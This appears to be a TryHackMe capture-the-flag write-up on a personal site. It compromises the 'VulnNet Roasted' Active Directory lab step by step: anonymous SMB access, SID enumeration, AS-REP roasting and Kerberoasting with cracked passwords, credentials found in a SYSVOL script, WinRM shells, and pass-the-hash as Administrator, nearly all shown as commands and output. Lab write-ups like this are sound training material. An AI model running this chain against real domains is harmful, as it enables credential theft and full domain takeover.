<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnnet Roasted | Technical Intelligence Labs</title>
    <link rel="stylesheet" href="../css/custom.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
        .markdown-content blockquote { 
            position: relative;
            border-left: 2px solid #22c55e; 
            padding: 1.5rem 0 1.5rem 1.75rem; 
            color: #cbd5e1; 
            margin-bottom: 2.5rem; 
            font-style: normal; 
            background: rgba(34, 197, 94, 0.03);
            border-radius: 0 4px 4px 0;
            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
        }
        .markdown-content blockquote::before {
            content: "TECHNICAL_INTELLIGENCE";
            position: absolute;
            top: -9px;
            left: 0;
            background: #22c55e;
            color: #000;
            font-size: 0.6rem;
            font-weight: bold;
            padding: 2px 6px;
            font-family: 'JetBrains Mono', monospace;
        }
        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
        .markdown-content p { margin-bottom: 1.5rem; }
        
        .diag-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            position: relative;
            overflow: hidden;
        }
        .diag-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 2px;
            height: 100%;
            background: #22c55e;
            opacity: 0.5;
        }
        .diag-label {
            display: block;
            font-size: 0.6rem;
            text-transform: uppercase;
            color: #64748b;
            margin-bottom: 0.25rem;
            letter-spacing: 0.1em;
        }
        .diag-value {
            font-size: 0.9rem;
            color: #cbd5e1;
        }
        .diag-blink {
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">

    <!-- Navigation -->
    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <a href="../index.html" class="logo-container group flex items-center gap-3">
                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
            </a>

            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
        <!-- Post Header -->
        <header class="mb-12 border-b border-slate-800 pb-12">
            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
                <span>// 2024-12-30</span>
                <span>// ID: REF-Vulnnet Roasted</span>
            </div>
            
            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Vulnnet Roasted</h1>
            
            <div class="flex flex-wrap gap-2">
                <!-- Tags populated by python -->
                <!-- tryhackme, ctf -->
            </div>
        </header>

        <!-- Markdown Body -->
        <div class="markdown-content">
            <h2>roasted</h2>
<h2>&gt; roasted</h2>
<h2>roasted</h2>
<blockquote>
<p>Target - 10.201.41.120</p>
<p>First scan target using nmap</p>
</blockquote>
<pre class="codehilite"><code>nmap -sC -sV -Pn -n -A 10.201.41.120
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 07:18 EDT
Nmap scan report for 10.201.41.120
Host is up (0.39s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 11:18:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-10T11:19:27
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   385.19 ms 10.21.0.1
2   ... 3
4   418.49 ms 10.201.41.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.23 seconds
</code></pre>

<pre class="codehilite"><code>❯ smbclient -L //10.201.41.120 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.41.120 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
</code></pre>

<pre class="codehilite"><code>❯ smbclient //10.201.41.120/VulnNet-Enterprise-Anonymous
Password for [WORKGROUP\kali]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \&gt; ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4532060 blocks available
smb: \&gt; get Enterprise-Operations.txt
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \&gt; get Enterprise-Safety.txt
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \&gt; get Enterprise-Sync.txt
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \&gt; exit
</code></pre>

<pre class="codehilite"><code>❯ smbclient //10.201.41.120/VulnNet-Business-Anonymous
Password for [WORKGROUP\kali]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4532005 blocks available
smb: \&gt; get Business-Manager.txt
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \&gt; get Business-Sections.txt
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \&gt; get Business-Tracking.txt
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \&gt; exit
</code></pre>

<pre class="codehilite"><code>❯ lookupsid.py anonymous@10.201.22.118
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.201.22.118
[*] StringBinding ncacn_np:10.201.22.118[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
</code></pre>

<pre class="codehilite"><code>❯ python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.201.33.149 -usersfile /home/kali/tryhackme/VulnNet/userlist.txt -no-pass -request -outputfile kerberos-users-found
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:dc5380f13ab22f3fa646cb0d3074fe91$36e94465959692d10c81f29ade6e7f2086f2b2ab74b56080b88bb96c01d4ec564b072c398ae7d0e4f4a6afe4e8fd9971ae813f6d43f838e82173c4c6e8fc7f443dd96aeffd250d05111750e4995230e3117ee5c2074e4000d8d134a11649c25580d1252e61f00883f2dee7c06a7765c9c1e9d38e238b16b6533e8bd0b14d2f04618ac694c8a649ef5674f17e25f5f92ef2eb2eb4df39545fd79a2fcd96a67098e99a979e69a06fa0f4891f48a30bc0f14ed2f004da37882b2f7397d278a23547d80bc918d1f75aae60cbcb133c8336a32327536cb905baed0aabed14992dcfccb51ea12c7841ca535fb2d902efa7986c747cbc9634c3
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
</code></pre>

<pre class="codehilite"><code>❯ john --format=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        (?)     
1g 0:00:00:03 DONE (2025-11-02 12:44) 0.3174g/s 1009Kp/s 1009Kc/s 1009KC/s tjalling..tj0216044
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.
</code></pre>

<pre class="codehilite"><code>❯ python3 GetUserSPNs.py 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.201.33.149 -request

Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$19a2b4d2a99203a39f091aebc4cb031b$0831e5589dae7b4f0b296d3cc77bdb9cda7fa26e76886ff5e965faaaa55be06ee48176d3d3a5bb7133080bfc93b70c981269f8ae07f4501340cf2a0c683fef8c652ea4439da16ea3135c96378b15a275c14ba9c5435ae73a608a1333041ea89c22d2806aad1cd01c76ba79542d28e237e2e6bbcb9eee9d2384a291f089280a54e43ca7abf910709a1d9956de7408d7c696d8a6d4040500a58aa6b8e77645626ba6c131ec5e00749297c96bf1b203e0fcbbac640b6ea0fbda73ffd6d5c507a6a76f945b4e2afa0ec6e18651badcb97fba1eca2c95c923f4cf65a0d0eb0d999c7bd4f1e978ae2b38ee07fd163fb56700136184f3edb97f4beb7e2eac4d27114b8181ab7ba2e6b236b22b493fa90aee9ddecb3aba56345d69182ef172a647180ffafeecb48462ceaa0fc176ad504a4290b120e8bb32d018783c24dd75986dfc34bcf6f724a0985c6cf27225a8c8ad8c81c6ca6bdc3c36229e779b505b5190f124742a2216f913ddd218621ac0d078a8e6dc768ab2c64b3d7468cc1c24375d32ffe650a7c59b9792083fe39945a8f3b079e21a76a95fa3b4affc499290ce79203279485d957cda39f62f34d70b496de99898171b5024b300f80b64ae887bc7a81b8e17d54b734d116847edf4ed30cf98363c73ff0727c00e187c5c2dd4ded98b52a3c50f42e210b2d8bbfc1d0219506835b5435a883608e68f263344943fc063ac918bdbfeae642bf81e69a08dee3ebe02810600ab2886b7353489704e0b0973955ff1ffb9d0d6453427d08541bf1c2367f28cbffc5ac0c4074818a307c5bd1a9ef62c2a7be29acd5d35b7c9fa2e09677ffdc760f31cecc0434cb63cbc5614ef89655535becd4846b92d726cfa6268e23c19aa30a16f66ae08d67844911e918bc5f357a12d94d172036bd4473d444bf0545e05f64b24e87953260aed51c9d5b97c0d703dd92c57d056cb5f32b001334abbcf1c89bc5b94a2f178942d16704df50db2a19ec925e22ac430ef13b0fdcf8f7a5a3e1185b0dcbe657760fa5508e425c03a7e07e012d82cf9f5444179f07da5b983b00066fba17adb6bb1b2dfb82a32af7e74ee62a0e29acd75c147920a9b78d82a9eb5f5c25c1a6b78f68a0c2074fc9fd868bb71296aa5c4b8ca1b0c7bc748fb7e95db50425cfe63467287b65c2e2657a69f791ec735aadd556193a6fdd7a1e43d9c9fca4164c2b267edf36411d43ef9816755104cd5d1e2558b3485c3fac6a4ee397db6644989d798c2512b8f228e67ed1914bb90cc2191552be8aa80875d73dda2453ef4fe06114efcdba8674aa9b7fcacb0e3e212e4778333ad2bd962b8e5f3650e1c591a6ea7b23fb8ae772e8b82372b1abaa81f71ead3c8f9e2ad9d6f5ef13bc67a7b3fc5341a194fe8c570
</code></pre>

<pre class="codehilite"><code>❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash1.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:02 DONE (2025-11-02 13:07) 0.3921g/s 1611Kp/s 1611Kc/s 1611KC/s ryan2lauren..ry=iIyD{N
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed. 
</code></pre>

<pre class="codehilite"><code>❯ evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.201.33.149

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents&gt; ls
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents&gt; cd ..
*Evil-WinRM* PS C:\Users\enterprise-core-vn&gt; ls


    Directory: C:\Users\enterprise-core-vn


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/13/2021   3:43 PM                Desktop
d-r---        3/13/2021   3:42 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\enterprise-core-vn&gt; cd Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop&gt; ls


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt
</code></pre>

<pre class="codehilite"><code>❯ smbclient //10.201.22.169/SYSVOL -U enterprise-core-vn
Password for [WORKGROUP\enterprise-core-vn]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8540159 blocks of size 4096. 4295508 blocks available
smb: \&gt; cd vulnnet-rst.local
smb: \vulnnet-rst.local\&gt; ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8540159 blocks of size 4096. 4292738 blocks available
smb: \vulnnet-rst.local\&gt; get scripts
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \vulnnet-rst.local\scripts
smb: \vulnnet-rst.local\&gt; cd scripts
smb: \vulnnet-rst.local\scripts\&gt; ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
ge
                8540159 blocks of size 4096. 4295363 blocks available
smb: \vulnnet-rst.local\scripts\&gt; get ResetPassword.vbs
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\&gt;
</code></pre>

<blockquote>
<p>so after checking vbs found username &amp; pwd</p>
</blockquote>
<pre class="codehilite"><code>strUserNTName = &quot;a-whitehat&quot;
strPassword = &quot;bNdKVkjv3RR9ht&quot;
</code></pre>

<pre class="codehilite"><code>❯ evil-winrm -u Administrator -H aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d -i 10.201.22.169 -N

Evil-WinRM shell v3.7

Error: Invalid hash format
❯ evil-winrm -u Administrator -H aad3b435b51404eeaad3b435b51404ee -i 10.201.22.169 -N

Evil-WinRM shell v3.7

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
❯ evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.201.22.169 -N

Evil-WinRM shell v3.7

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ls
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
*Evil-WinRM* PS C:\Users\Administrator&gt; ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/11/2021   9:38 AM                3D Objects
d-r---        3/11/2021   9:38 AM                Contacts
d-r---        3/13/2021   3:31 PM                Desktop
d-r---        3/11/2021   9:38 AM                Documents
d-r---        3/11/2021   9:38 AM                Downloads
d-r---        3/11/2021   9:38 AM                Favorites
d-r---        3/11/2021   9:38 AM                Links
d-r---        3/11/2021   9:38 AM                Music
d-r---        3/11/2021   9:38 AM                Pictures
d-r---        3/11/2021   9:38 AM                Saved Games
d-r---        3/11/2021   9:38 AM                Searches
d-r---        3/11/2021   9:38 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt
</code></pre>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div class="diag-card text-left">
                <span class="diag-label">Access_Level</span>
                <span class="diag-value">OMNI_READ_ONLY</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Encryption</span>
                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Signal_Strength</span>
                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">System_Status</span>
                <span class="diag-value">STABLE_HARDENED</span>
            </div>
        </div>

        <div class="flex justify-center gap-6 mb-8">
            <a href="https://github.com/kalialucard" target="_blank"
                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
                    class="fa-brands fa-github"></i></a>
            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
        </div>
        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
    </footer>

    <script src="../js/main.js"></script>
</body>
</html>